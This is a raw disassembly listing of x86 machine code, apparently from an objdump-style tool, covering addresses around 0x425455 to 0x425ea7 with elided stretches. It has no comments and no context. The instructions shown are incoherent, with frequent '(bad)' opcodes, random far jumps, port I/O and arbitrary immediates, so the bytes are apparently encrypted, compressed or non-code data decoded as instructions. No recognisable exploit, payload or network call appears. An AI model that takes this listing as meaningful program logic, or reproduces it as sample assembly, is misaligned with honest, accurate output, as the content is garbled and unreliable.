  425455:	iret   
  425456:	pushf  
  425457:	test   BYTE PTR [edi+0x1cd3011d],dl
  42545d:	leave  
  42545e:	jnp    0x425431
  425460:	pusha  
  425461:	mov    esi,0x3b96dc77
  425466:	jae    0x425420
  425468:	pusha  
  425469:	mov    esi,0xe3b76747
	...
  4254d6:	inc    edx
  4254d7:	or     esp,eax
  4254d9:	test   eax,0xeb6fedcf
  4254de:	fcomp  DWORD PTR [edx]
  4254e1:	add    esi,DWORD PTR [esi+0x8]
  4254e4:	adc    dl,bl
  4254e6:	addr16 nop
  4254e8:	add    DWORD PTR [eax],eax
  4254ea:	add    BYTE PTR [ecx],al
  4254ec:	add    BYTE PTR [eax],al
  4254ee:	mov    eax,0x6bbf9a06
  4254f3:	adc    bh,dh
  4254f5:	stc    
  4254f6:	push   0x41
  4254f8:	and    BYTE PTR [ecx-0x66],0x73
  4254fc:	inc    esp
  4254fd:	xor    al,0x58
  4254ff:	sbb    eax,0x326e5bab
  425504:	sahf   
  425505:	mov    bl,BYTE PTR [edx+0x5f]
  425508:	(bad)  
  425509:	mov    BYTE PTR [edx+ecx*1-0x58],0xd0
  42550e:	xor    bh,BYTE PTR [ebx]
  425510:	mov    fs,WORD PTR [edi+ebx*4-0x18c090ac]
  425517:	mov    ch,0x1b
  425519:	pop    ecx
  42551a:	fs add al,0xe3
  42551d:	scas   al,BYTE PTR es:[edi]
  42551e:	cs mov esi,0xa00ccd6a
  425524:	(bad)  
  425525:	jmp    0x425580
  425527:	outs   dx,DWORD PTR ds:[esi]
  425528:	popa   
  425529:	xchg   DWORD PTR [ebx+0x3b],esi
  42552c:	sub    bh,BYTE PTR [eax]
  42552e:	ins    DWORD PTR es:[edi],dx
  42552f:	cdq    
  425530:	ins    DWORD PTR es:[edi],dx
  425531:	mov    cl,0xee
  425533:	jae    0x425529
  425535:	jb     0x425520
  425537:	aaa    
  425538:	dec    esi
  425539:	cmp    bh,BYTE PTR [edi]
  42553b:	nop
  42553c:	or     al,0xee
  42553e:	es pop ebp
  425540:	mov    esp,0x7bc7845f
  425545:	test   BYTE PTR [edx+edi*1],0xa5
  425549:	out    0x9b,al
  42554b:	and    eax,0x6e79dc04
  425550:	or     ebx,DWORD PTR [ecx]
  425552:	in     eax,0x6c
  425554:	jmp    0x9599214b
  425559:	add    ebp,0x39b93b1e
  42555f:	mov    ah,ch
  425561:	adc    al,0x11
  425563:	add    bl,BYTE PTR [ebx-0x3de0c3e2]
  425569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42556a:	xchg   BYTE PTR [ecx+0x4a6b2f9c],bl
  425570:	pop    ss
  425571:	sbb    al,0x98
  425573:	mov    ds:0xc4c08ef8,eax
  425578:	add    eax,0x7696e74a
  42557d:	or     ebp,DWORD PTR [edi-0x4dfba1e]
  425583:	and    eax,0xaaee1209
  425588:	adc    ecx,ebx
  42558a:	mov    bh,0x26
  42558c:	mov    ch,0x76
  42558e:	(bad)  
  42558f:	test   eax,0x8889349c
  425594:	jns    0x4255b8
  425596:	mov    ecx,0x86a1d962
  42559b:	sub    dl,BYTE PTR [edx-0x309b94cc]
  4255a1:	sahf   
  4255a2:	cmp    BYTE PTR [esi+0x42],al
  4255a5:	rcl    cl,cl
  4255a7:	(bad)  
  4255a8:	sbb    al,ch
  4255aa:	xor    ch,0xf6
  4255ad:	pop    edi
  4255ae:	popa   
  4255af:	les    edx,FWORD PTR [ebp-0x4e9c9304]
  4255b5:	and    eax,0x21d03bd9
  4255ba:	test   eax,0x8ff4b108
  4255bf:	nop
  4255c0:	lods   eax,DWORD PTR ds:[esi]
  4255c1:	out    0xf7,eax
  4255c3:	loope  0x4255d1
  4255c5:	add    eax,0x58e28bc2
  4255ca:	je     0xb5fc926d
  4255d0:	addr16 mov ebx,0x476468f4
  4255d6:	sahf   
  4255d7:	sub    DWORD PTR [eax+0x6b64b909],eax
  4255dd:	clc    
  4255de:	mov    bh,bl
  4255e0:	cld    
  4255e1:	jp     0x4255b3
  4255e3:	push   0x78a13f03
  4255e8:	cmp    al,0x7e
  4255ea:	or     al,0x68
  4255ec:	mov    cl,0x1d
	...
  425656:	(bad)  
  425657:	jmp    0xfef4:0xfe6e7a4e
  42565e:	dec    ebp
  42565f:	mov    esi,0xe2bbf13a
  425664:	jbe    0x4255fa
  425666:	addr16 xchg ecx,eax
  425668:	add    DWORD PTR [eax],eax
  42566a:	add    BYTE PTR [ecx],al
  42566c:	add    BYTE PTR [eax],al
  42566e:	lods   al,BYTE PTR ds:[esi]
  42566f:	loop   0x4256e5
  425671:	arpl   WORD PTR [eax+0x61],bx
  425674:	inc    ecx
  425675:	pop    esi
  425676:	pop    ds
  425677:	adc    ebp,DWORD PTR [esi-0x57]
  42567a:	loope  0x425633
  42567c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42567d:	inc    ebx
  42567e:	xor    ch,BYTE PTR [esi-0x3e]
  425681:	add    ch,ah
  425683:	pop    edx
  425684:	push   edi
  425685:	adc    al,0x59
  425687:	lock adc eax,0x8f372613
  42568d:	dec    edi
  42568e:	std    
  42568f:	or     bh,ah
  425691:	jmp    0x48a384a9
  425696:	retf   
  425697:	jmp    0xf291:0xa871d51
  42569e:	lahf   
  42569f:	adc    eax,DWORD PTR [ebp-0x6a2c3963]
  4256a5:	sub    al,BYTE PTR [ecx+0x4f]
  4256a8:	imul   ecx,esi,0xf0f14b64
  4256ae:	mov    ah,0xe3
  4256b0:	jmp    ebx
  4256b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256b3:	push   gs
  4256b5:	adc    DWORD PTR ds:0xdbe2d3a0,ecx
  4256bb:	sti    
  4256bc:	imul   DWORD PTR [ecx-0x5b]
  4256bf:	and    DWORD PTR ds:0xa23508f,ecx
  4256c5:	inc    esp
  4256c6:	out    dx,eax
  4256c7:	pop    edi
  4256c8:	add    eax,0x4b289e0f
  4256cd:	arpl   WORD PTR [ebp-0x71262251],cx
  4256d3:	fld    QWORD PTR [ebx-0x23]
  4256d6:	lea    edi,[ecx+0x7bf7d60a]
  4256dc:	mov    esp,0x7519fcb1
  4256e1:	mov    ah,0xe3
  4256e3:	xchg   ebx,eax
  4256e4:	addr16 inc edi
  4256e6:	sti    
  4256e7:	std    
  4256e8:	inc    ebp
  4256e9:	lods   al,BYTE PTR ds:[esi]
  4256ea:	mov    ds:0x29a42baa,eax
  4256ef:	out    0xcc,eax
  4256f1:	(bad)  [ebx]
  4256f3:	adc    al,0x85
  4256f5:	add    al,0xe4
  4256f7:	repz cmp al,0x4
  4256fa:	mov    ah,0x10
  4256fc:	lds    esi,FWORD PTR [ebx]
  4256fe:	jp     0x425686
  425700:	pop    ebp
  425701:	push   es
  425702:	sub    dl,BYTE PTR [ebx-0x3c]
  425705:	inc    ebp
  425706:	fst    DWORD PTR [eax]
  425708:	sub    al,0xa7
  42570a:	les    esp,FWORD PTR [edi]
  42570c:	sbb    esi,esp
  42570e:	fisubr WORD PTR [esi+0x34e74f6e]
  425714:	dec    edx
  425715:	jmp    0x83b5:0x90d275dc
  42571c:	retf   0x1dc6
  42571f:	mov    ds:0x376074df,eax
  425724:	pop    es
  425725:	push   esp
  425726:	(bad)  
  425727:	mov    ah,0x32
  425729:	in     eax,dx
  42572a:	xor    eax,0x2e2e37a7
  42572f:	rcl    cl,1
  425731:	scas   eax,DWORD PTR es:[edi]
  425732:	sbb    BYTE PTR [edi],cl
  425734:	fwait
  425735:	xchg   ebx,eax
  425736:	sub    esp,DWORD PTR [edx-0x16e5a00a]
  42573c:	cli    
  42573d:	test   ch,dl
  42573f:	les    edi,FWORD PTR [edx-0x1f94f4c5]
  425745:	into   
  425746:	xchg   esp,eax
  425747:	add    edx,DWORD PTR [edx+0x36]
  42574a:	add    al,0xa9
  42574c:	or     DWORD PTR [edx+0x16a9296b],esp
  425752:	cmp    esi,ebx
  425754:	inc    ebx
  425755:	pop    ebp
  425756:	sub    eax,DWORD PTR [eax-0x2a]
  425759:	dec    BYTE PTR [ecx-0x48]
  42575c:	lods   eax,DWORD PTR ds:[esi]
  42575d:	loope  0x42570d
  42575f:	retf   
  425760:	test   al,0x38
  425762:	pop    ss
  425763:	sub    edi,esi
  425765:	scas   al,BYTE PTR es:[edi]
  425766:	fwait
  425767:	pop    ebx
  425768:	iret   
  425769:	jl     0x425781
  42576b:	jb     0x42579a
  42576d:	mov    esi,0x0
	...
  4257d6:	(bad)  
  4257d7:	aaa    
  4257d8:	shl    BYTE PTR [ebx+esi*8],cl
  4257db:	cmc    
  4257dc:	div    bh
  4257de:	test   DWORD PTR [edi+0x3f],0xbc859174
  4257e5:	mov    al,ds:0x19267
  4257ea:	add    BYTE PTR [ecx],al
  4257ec:	add    BYTE PTR [eax],al
  4257ee:	xor    DWORD PTR [ebx],ebp
  4257f0:	imul   edx,edi,0xffffffbd
  4257f3:	(bad)  [eax-0xe]
  4257f6:	lahf   
  4257f7:	dec    edx
  4257f8:	test   al,0x6b
  4257fa:	jbe    0x425827
  4257fc:	retf   
  4257fd:	jle    0x42583c
  4257ff:	adc    ebx,edi
  425801:	xchg   edi,eax
  425802:	out    dx,eax
  425803:	loop   0x425875
  425805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425806:	cli    
  425807:	jns    0x4257ce
  425809:	std    
  42580a:	dec    ebp
  42580b:	(bad)  
  42580c:	xor    edi,DWORD PTR [ecx-0x29242ea8]
  425812:	jne    0x425856
  425814:	scas   al,BYTE PTR es:[edi]
  425815:	jb     0x4257a2
  425817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425818:	test   al,0x24
  42581a:	cdq    
  42581b:	lahf   
  42581c:	mov    bl,0x24
  42581e:	rcr    edi,0xbb
  425821:	lahf   
  425822:	lods   al,BYTE PTR ds:[esi]
  425823:	jo     0x4257c1
  425825:	xchg   ebx,eax
  425826:	ss out 0x7b,al
  425829:	inc    esi
  42582a:	pop    ebx
  42582b:	nop    DWORD PTR [edx+ecx*8+0x1e71056f]
  425833:	jbe    0x4258ac
  425835:	xor    eax,0xb91bfece
  42583a:	push   esp
  42583b:	dec    edi
  42583c:	jnp    0x4257f0
  42583e:	(bad)  
  42583f:	stos   BYTE PTR es:[edi],al
  425840:	call   0x8e52060d
  425845:	inc    esi
  425846:	ja     0x42586a
  425848:	sub    esp,ebp
  42584a:	hlt    
  42584b:	repnz into 
  42584d:	xor    ebp,edi
  42584f:	(bad)  
  425850:	adc    ecx,ebp
  425852:	jbe    0x4258ba
  425854:	nop
  425855:	les    eax,FWORD PTR [ebx]
  425857:	xchg   ebp,eax
  425858:	dec    edx
  425859:	jg     0x4257e8
  42585b:	cli    
  42585c:	adc    al,0x28
  42585e:	rol    DWORD PTR [ecx+edx*8-0x14dda04b],1
  425865:	scas   eax,DWORD PTR es:[edi]
  425866:	out    dx,eax
  425867:	lods   al,BYTE PTR ds:[esi]
  425868:	shr    DWORD PTR [esi],0x6e
  42586b:	mov    ds:0xf5cb148c,al
  425870:	mov    ds:0xf11b28e7,al
  425875:	daa    
  425876:	pusha  
  425877:	mov    ss,ebx
  425879:	loop   0x42587c
  42587b:	and    BYTE PTR [ecx+0x458ec8a5],ah
  425881:	inc    ecx
  425882:	loopne 0x4258a5
  425884:	sbb    al,0x29
  425886:	jb     0x4258d3
  425888:	add    ebx,edi
  42588a:	or     eax,0x64e97b53
  42588f:	jne    0x425811
  425891:	int    0xbf
  425893:	push   ebp
  425894:	pushf  
  425895:	cmp    eax,edi
  425897:	sub    al,0x87
  425899:	pop    edx
  42589a:	cmp    eax,0xc7ed102d
  42589f:	aad    0x63
  4258a1:	adc    ebx,esp
  4258a3:	cmp    eax,0x4e3a8a24
  4258a8:	stc    
  4258a9:	inc    edi
  4258aa:	mul    DWORD PTR [eax-0x5d]
  4258ad:	or     DWORD PTR [ebp*2-0x67ba7249],eax
  4258b4:	outs   dx,BYTE PTR ds:[esi]
  4258b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258b6:	dec    ebp
  4258b7:	aas    
  4258b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4258b9:	jmp    0xac771eb3
  4258be:	inc    ebx
  4258bf:	push   eax
  4258c0:	imul   BYTE PTR [eax+0x4a]
  4258c3:	fld    st(5)
  4258c5:	icebp  
  4258c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258c7:	mov    ebp,0x8784d9ef
  4258cc:	sbb    ch,BYTE PTR [esi]
  4258ce:	test   BYTE PTR [ebp-0x613e0d4b],ah
  4258d4:	mov    ebx,0x6a79ef28
  4258d9:	jle    0x425860
  4258db:	mov    bh,0x7e
  4258dd:	test   BYTE PTR ds:0x5eb5b217,bh
  4258e3:	outs   dx,BYTE PTR ds:[esi]
  4258e4:	xlat   BYTE PTR ds:[ebx]
  4258e5:	mov    ds:0xa6f2a8f,eax
  4258ea:	ins    DWORD PTR es:[edi],dx
  4258eb:	mov    ebp,eax
  4258ed:	mov    eax,0x0
	...
  425956:	pop    esp
  425957:	push   edx
  425958:	nop
  425959:	push   edx
  42595a:	sahf   
  42595b:	rcr    dh,cl
  42595d:	pop    esi
  42595e:	adc    BYTE PTR [edx+0x55],0x71
  425962:	aam    0xde
  425964:	jge    0x425916
  425966:	addr16 xchg ebx,eax
  425968:	add    DWORD PTR [eax],eax
  42596a:	add    BYTE PTR [ecx],al
  42596c:	add    BYTE PTR [eax],al
  42596e:	jecxz  0x4259c4
  425970:	xchg   edx,eax
  425971:	mov    eax,0x4834e44c
  425976:	inc    ebx
  425977:	div    BYTE PTR [edi+ecx*2+0x3d]
  42597b:	fwait
  42597c:	ss mov esi,0x35c23b73
  425982:	jne    0x42593f
  425984:	fidivr DWORD PTR [ebx-0x20e2f03a]
  42598a:	pop    eax
  42598b:	add    al,BYTE PTR [ebx-0x68]
  42598e:	pop    es
  42598f:	inc    ecx
  425990:	adc    al,dh
  425992:	mov    gs,WORD PTR [ebp-0x72]
  425995:	xor    eax,0xaa8e91f6
  42599a:	mov    eax,ds:0xc0de8a22
  42599f:	mov    ds:0x8bf39c1,al
  4259a4:	into   
  4259a5:	and    esp,DWORD PTR [esi]
  4259a7:	lock rcl BYTE PTR [edx-0x2f1bfc8a],1
  4259ae:	pop    ebp
  4259af:	pop    ebx
  4259b0:	(bad)  
  4259b1:	pop    esi
  4259b2:	jmp    0xaed8:0xbc73a0da
  4259b9:	fs and eax,0x4ed26522
  4259bf:	sub    bh,BYTE PTR [edi]
  4259c1:	jbe    0x425950
  4259c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259c4:	adc    al,0x0
  4259c6:	jp     0x425a3b
  4259c8:	outs   dx,BYTE PTR ds:[esi]
  4259c9:	push   esi
  4259ca:	push   esp
  4259cb:	dec    edi
  4259cc:	push   edx
  4259cd:	sub    DWORD PTR [ecx+0x5c],ebp
  4259d0:	fwait
  4259d1:	dec    eax
  4259d2:	sub    ecx,DWORD PTR [esi]
  4259d4:	fild   QWORD PTR [ecx]
  4259d6:	sahf   
  4259d7:	xor    eax,0x122fde9
  4259dc:	push   0xffffff83
  4259de:	push   eax
  4259df:	mov    BYTE PTR [eax+0x6bf9dbde],0x9b
  4259e6:	nop
  4259e7:	arpl   bx,cx
  4259e9:	dec    esp
  4259ea:	scas   eax,DWORD PTR es:[edi]
  4259eb:	clc    
  4259ec:	sbb    eax,0xa2f74663
  4259f1:	lahf   
  4259f2:	ficom  WORD PTR ds:0x78f1f38f
  4259f8:	mov    ds:0x8a8e1e77,eax
  4259fd:	enter  0x9e44,0x61
  425a01:	lds    ebp,FWORD PTR [edi-0x4c]
  425a04:	popa   
  425a05:	cmp    al,0xba
  425a07:	icebp  
  425a08:	jecxz  0x4259f7
  425a0a:	bound  edx,QWORD PTR [ebp+0x0]
  425a0d:	add    DWORD PTR [edx+0x9],ebp
  425a10:	inc    esi
  425a11:	popa   
  425a12:	add    eax,edi
  425a14:	lds    esp,FWORD PTR [esi+0x6bec2808]
  425a1a:	adc    al,0x50
  425a1c:	push   eax
  425a1d:	js     0x4259b3
  425a1f:	sbb    BYTE PTR [edx-0x235884b2],bh
  425a25:	xor    ch,BYTE PTR [edi+0x73f39a0c]
  425a2b:	adc    DWORD PTR [edx],esp
  425a2d:	int    0x5c
  425a2f:	jmp    0xbcfd:0x279de870
  425a36:	cld    
  425a37:	hlt    
  425a38:	sub    eax,0xd6e1179a
  425a3d:	mov    dl,0xca
  425a3f:	or     al,0xe1
  425a41:	pop    esp
  425a42:	ret    
  425a43:	jp     0x425a41
  425a45:	cld    
  425a46:	xor    bl,ah
  425a48:	mov    al,0x6e
  425a4a:	sbb    eax,0x1211d061
  425a4f:	mov    BYTE PTR [ecx],ch
  425a51:	(bad)  
  425a53:	div    DWORD PTR [eax+0xaed4dc8]
  425a59:	lock mov ebx,0x41f1e6b9
  425a5f:	ds iret 
  425a61:	mov    al,ds:0x30a73dda
  425a66:	push   esp
  425a67:	inc    esp
  425a68:	mov    edi,0x5364051a
  425a6d:	mov    BYTE PTR [eax],0x0
	...
  425ad4:	add    BYTE PTR [eax],al
  425ad6:	shl    DWORD PTR [ebx+0x4],0x67
  425ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425adb:	jcxz   0x425ac5
  425ade:	(bad)  
  425adf:	fimul  DWORD PTR [edi+eax*4-0x5c9d1884]
  425ae6:	addr16 xchg esp,eax
  425ae8:	add    DWORD PTR [eax],eax
  425aea:	add    BYTE PTR [ecx],al
  425aec:	add    BYTE PTR [eax],al
  425aee:	jmp    0x425aec
  425af0:	xchg   edx,eax
  425af1:	in     eax,dx
  425af2:	pop    ss
  425af3:	cmp    DWORD PTR [ecx],0x384b4d75
  425af9:	hlt    
  425afa:	and    ah,0xa7
  425afd:	icebp  
  425afe:	loope  0x425adc
  425b00:	adc    ebp,edi
  425b02:	jmp    0x5a3c7bc3
  425b07:	sub    al,0x92
  425b09:	push   0x5f
  425b0b:	or     dl,dh
  425b0d:	(bad)  
  425b0e:	stos   BYTE PTR es:[edi],al
  425b0f:	lea    esp,[esi]
  425b11:	es jns 0x425b73
  425b14:	outs   dx,DWORD PTR ds:[esi]
  425b15:	adc    dh,0x99
  425b18:	in     al,dx
  425b19:	mov    eax,0x3da0b3e7
  425b1e:	int    0x89
  425b20:	mov    ah,0xc
  425b22:	inc    ecx
  425b23:	mov    ebx,0x644d46a9
  425b28:	or     cl,bl
  425b2a:	jg     0x425b43
  425b2c:	lds    ecx,FWORD PTR [edi-0x3c]
  425b2f:	sbb    cl,BYTE PTR [ecx]
  425b31:	pop    ebp
  425b32:	pop    esi
  425b33:	int3   
  425b34:	push   ecx
  425b35:	cmp    ebx,esi
  425b37:	add    eax,0xe0e89a91
  425b3c:	xchg   ecx,eax
  425b3d:	xor    ecx,DWORD PTR [ebx]
  425b3f:	or     al,0xcc
  425b41:	hlt    
  425b42:	mov    al,0x81
  425b44:	adc    ch,BYTE PTR [esi+0x76]
  425b47:	sub    al,0x7c
  425b49:	call   0x3176:0x19b1e656
  425b50:	jg     0x425af2
  425b52:	xchg   edi,eax
  425b53:	enter  0x426a,0x49
  425b57:	cmp    BYTE PTR [edx+0x1],al
  425b5a:	test   ebx,esi
  425b5c:	ret    
  425b5d:	add    BYTE PTR [edi],cl
  425b5f:	aaa    
  425b60:	xchg   ah,dh
  425b62:	mov    WORD PTR [ebp-0x7e5d6c5],ss
  425b68:	hlt    
  425b69:	and    ebx,DWORD PTR [ebx-0x55f9cba8]
  425b6f:	xlat   BYTE PTR ds:[ebx]
  425b70:	and    ah,BYTE PTR [ecx]
  425b72:	test   DWORD PTR [esi],edx
  425b74:	jp     0x425ba3
  425b76:	or     eax,eax
  425b78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b79:	sbb    eax,0x170fd2b6
  425b7e:	jl     0x425b92
  425b80:	std    
  425b81:	nop
  425b82:	inc    ebx
  425b83:	imul   edx,DWORD PTR [edx],0xe33e3cfc
  425b89:	jae    0x425bab
  425b8b:	lock ror DWORD PTR [ebx-0x338d542f],0x77
  425b93:	mov    al,ds:0x40dc7f1b
  425b98:	hlt    
  425b99:	int3   
  425b9a:	xor    DWORD PTR [esi],eax
  425b9c:	(bad)  
  425b9d:	sbb    eax,0xae58084e
  425ba2:	push   ecx
  425ba3:	cld    
  425ba4:	pop    edi
  425ba5:	aaa    
  425ba6:	pop    DWORD PTR [ebp+0x15]
  425ba9:	and    DWORD PTR [eax+0x20],ecx
  425bac:	inc    esi
  425bad:	pop    ecx
  425bae:	aam    0x5f
  425bb0:	and    bh,BYTE PTR [edi-0x51]
  425bb3:	cld    
  425bb4:	and    al,0x42
  425bb7:	pop    edx
  425bb8:	xchg   DWORD PTR [ecx],ebx
  425bba:	pop    edi
  425bbb:	shl    DWORD PTR [esp+ebx*8-0x56],1
  425bbf:	mov    ecx,0x34bdfb5f
  425bc4:	push   ebp
  425bc5:	adc    edi,DWORD PTR [ecx]
  425bc7:	pop    es
  425bc8:	mov    dh,0xa1
  425bca:	out    0xbc,eax
  425bcc:	mov    edi,0xcfdb85ff
  425bd1:	jecxz  0x425bc0
  425bd3:	jo     0x425bd9
  425bd5:	shr    bh,0xf
  425bd8:	test   bh,dl
  425bda:	call   0xe4d1:0x165f2837
  425be1:	out    0xbb,eax
  425be3:	push   ebp
  425be4:	iret   
  425be5:	jmp    0xcd56:0xfd17aef1
  425bec:	pop    edi
  425bed:	fild   DWORD PTR [eax]
	...
  425c53:	add    BYTE PTR [eax],al
  425c55:	add    ah,al
  425c57:	clc    
  425c58:	jnp    0x425cb0
  425c5a:	jg     0x425c33
  425c5c:	in     eax,dx
  425c5d:	cli    
  425c5e:	enter  0xe6cd,0x96
  425c62:	(bad)  
  425c63:	std    
  425c64:	and    al,0xa0
  425c66:	addr16 xchg ebp,eax
  425c68:	add    DWORD PTR [eax],eax
  425c6a:	add    BYTE PTR [ecx],al
  425c6c:	add    BYTE PTR [eax],al
  425c6e:	cvttps2pi mm7,QWORD PTR [ecx-0x21]
  425c72:	mov    ?,WORD PTR [edx]
  425c74:	stos   DWORD PTR es:[edi],eax
  425c75:	and    eax,0xcf6c29ee
  425c7a:	add    edx,ebx
  425c7c:	jmp    0xc71f:0x7d93134a
  425c83:	in     eax,dx
  425c84:	and    dh,BYTE PTR [eax-0x4b93990b]
  425c8a:	dec    edx
  425c8b:	inc    edi
  425c8c:	pop    edx
  425c8d:	out    dx,eax
  425c8e:	and    ecx,DWORD PTR [ebp+edi*2-0x5230ffea]
  425c95:	ror    BYTE PTR [ebx],0x14
  425c98:	jmp    FWORD PTR [esi-0x3ecf84f9]
  425c9e:	sub    al,0x3c
  425ca0:	imul   esp,DWORD PTR [edi+0x31],0xffffff8f
  425ca4:	mov    dl,0x9a
  425ca6:	push   esp
  425ca7:	inc    ebp
  425ca8:	retf   
  425ca9:	sub    BYTE PTR [edi],al
  425cab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425cac:	fwait
  425cad:	mov    al,ds:0xb5145d64
  425cb2:	maskmovq mm3,(bad)
  425cb3:	neg    DWORD PTR [esi-0xa]
  425cb6:	sub    al,0x66
  425cb8:	or     esi,edx
  425cba:	int3   
  425cbb:	xchg   edx,eax
  425cbc:	aas    
  425cbd:	jne    0x425cdd
  425cbf:	mov    al,0x9a
  425cc1:	stos   DWORD PTR es:[edi],eax
  425cc2:	xchg   ebp,eax
  425cc3:	or     edi,DWORD PTR [edi]
  425cc5:	aam    0x4d
  425cc7:	push   esp
  425cc8:	sub    BYTE PTR [edx],dl
  425cca:	out    dx,eax
  425ccb:	or     al,BYTE PTR [ebp+0xa]
  425cce:	loopne 0x425c6e
  425cd0:	sub    BYTE PTR [ecx-0x20],cl
  425cd3:	pusha  
  425cd4:	inc    ebx
  425cd5:	pop    ebx
  425cd6:	fs stc 
  425cd8:	popf   
  425cd9:	adc    al,0x5
  425cdb:	pop    ebp
  425cdc:	pop    eax
  425cdd:	mov    edx,ss
  425cdf:	inc    ebp
  425ce0:	dec    esp
  425ce1:	xchg   edi,eax
  425ce2:	cld    
  425ce3:	cdq    
  425ce4:	popf   
  425ce5:	mov    bh,0xb2
  425ce7:	and    al,0x16
  425ce9:	xor    eax,0xf913f78
  425cee:	(bad)  
  425cef:	or     cl,BYTE PTR [edi-0x72]
  425cf2:	sub    al,0x32
  425cf4:	mov    al,ds:0x88f921fc
  425cf9:	enter  0x5fcf,0x8b
  425cfd:	cmp    bl,BYTE PTR [ecx+0x5c9deedb]
  425d03:	add    dl,BYTE PTR [edi+esi*8-0x42fbf1d3]
  425d0a:	stc    
  425d0b:	pop    eax
  425d0c:	pushf  
  425d0d:	dec    esp
  425d0e:	nop
  425d0f:	sub    ch,BYTE PTR [edi+0xf7ca805]
  425d15:	or     BYTE PTR [eax-0x2b1275c6],0x5
  425d1c:	dec    ecx
  425d1d:	pop    esi
  425d1e:	sbb    al,0x51
  425d20:	inc    eax
  425d21:	(bad)  
  425d22:	xchg   edx,eax
  425d23:	mov    edi,0xbadb7739
  425d28:	push   ds
  425d29:	push   esp
  425d2a:	test   DWORD PTR [eax],edi
  425d2c:	lds    ecx,FWORD PTR [esi+0x55]
  425d2f:	xor    eax,0xf6fd773f
  425d34:	iret   
  425d35:	pusha  
  425d36:	dec    edx
  425d37:	lea    eax,[edx-0x3628e348]
  425d3d:	(bad)  
  425d3e:	(bad)  
  425d3f:	lahf   
  425d40:	arpl   bp,sp
  425d42:	inc    esi
  425d43:	push   0x59
  425d45:	xchg   esp,eax
  425d46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d47:	xchg   ebx,eax
  425d48:	dec    eax
  425d49:	push   eax
  425d4a:	adc    DWORD PTR [ecx+0x3d4086db],esp
  425d50:	dec    edi
  425d51:	(bad)  
  425d52:	dec    edx
  425d53:	push   edx
  425d54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d55:	out    0x73,eax
  425d57:	xchg   dl,ch
  425d59:	ret    
  425d5a:	push   edi
  425d5b:	jp     0x425d86
  425d5d:	sub    esi,edx
  425d5f:	jbe    0x425cfa
  425d61:	lods   eax,DWORD PTR ds:[esi]
  425d62:	(bad)  
  425d63:	mov    eax,ds:0xd1614312
  425d68:	xor    esi,DWORD PTR [esi]
  425d6a:	rol    BYTE PTR [eax+0x43a1],0x0
	...
  425dd5:	add    bh,bh
  425dd7:	lods   al,BYTE PTR ds:[esi]
  425dd8:	fadd   QWORD PTR [edi]
  425dda:	fbstp  TBYTE PTR [edi-0x1]
  425ddd:	cld    
  425dde:	gs addr16 stc 
  425de1:	mov    ds:0x6ac605d9,al
  425de6:	addr16 xchg esi,eax
  425de8:	add    DWORD PTR [eax],eax
  425dea:	add    BYTE PTR [ecx],al
  425dec:	add    BYTE PTR [eax],al
  425dee:	(bad)  
  425def:	mov    bl,0xf2
  425df1:	pop    edi
  425df2:	push   cs
  425df3:	ss aad 0x44
  425df6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425df7:	sub    ebx,DWORD PTR [esi]
  425df9:	jmp    0xc24d:0xa6a5f46d
  425e00:	imul   esi,DWORD PTR [edx+0x12],0x65
  425e04:	pop    edi
  425e05:	imul   ebx,DWORD PTR [edi-0x39],0x12302a04
  425e0c:	pop    ss
  425e0d:	lods   eax,DWORD PTR ds:[esi]
  425e0e:	and    eax,0xc0559c1f
  425e13:	cmc    
  425e14:	or     bh,ah
  425e16:	push   ss
  425e17:	xor    dl,bh
  425e19:	sub    BYTE PTR [edi-0x3e],ah
  425e1c:	cmp    edx,DWORD PTR [eax-0xd8e086]
  425e22:	out    0x5b,eax
  425e24:	sar    BYTE PTR [edx],cl
  425e26:	or     edi,DWORD PTR ds:0x8abf570f
  425e2c:	xchg   edx,eax
  425e2d:	aas    
  425e2e:	xlat   BYTE PTR ds:[ebx]
  425e2f:	mov    ebx,0xbbc6735e
  425e34:	in     al,0x82
  425e36:	jmp    0x425de7
  425e38:	sub    DWORD PTR [eax-0x2e4bb0e3],edi
  425e3e:	pop    ds
  425e3f:	jmp    0x8e78:0xef611a0a
  425e46:	(bad)  
  425e47:	pop    edx
  425e48:	xor    al,0x8a
  425e4a:	inc    edi
  425e4b:	gs push 0x440c1fd4
  425e51:	(bad)  
  425e52:	mov    al,0xcc
  425e54:	push   0x63
  425e56:	sbb    cl,BYTE PTR [ecx]
  425e58:	mov    ds:0xbea1487a,al
  425e5d:	adc    eax,0x52680787
  425e62:	cmp    al,0x51
  425e64:	push   eax
  425e65:	mov    ch,0x8f
  425e67:	xchg   ecx,eax
  425e68:	mov    WORD PTR [edx+0x5],?
  425e6b:	sub    DWORD PTR [edx-0x6736449a],esi
  425e71:	mov    ebp,0xa539778e
  425e76:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  425e78:	cld    
  425e79:	xchg   edi,eax
  425e7a:	outs   dx,BYTE PTR ds:[esi]
  425e7b:	push   eax
  425e7c:	xor    BYTE PTR ds:0xbb669715,0x3f
  425e83:	cli    
  425e84:	sbb    edi,eax
  425e86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e87:	popa   
  425e88:	js     0x425e3e
  425e8a:	jle    0x425e8b
  425e8c:	dec    ebp
  425e8d:	jp     0x425e20
  425e8f:	iret   
  425e90:	aam    0xa2
  425e92:	inc    eax
  425e93:	les    esp,FWORD PTR [edx+0x5e]
  425e96:	mov    ds:0x99dcaaf1,al
  425e9b:	in     al,0x53
  425e9d:	aaa    
  425e9e:	in     al,dx
  425e9f:	push   esi
  425ea0:	nop
  425ea1:	and    bl,bl
  425ea3:	(bad)  
  425ea4:	int3   
  425ea5:	add    al,0x78
  425ea7:	(bad)  
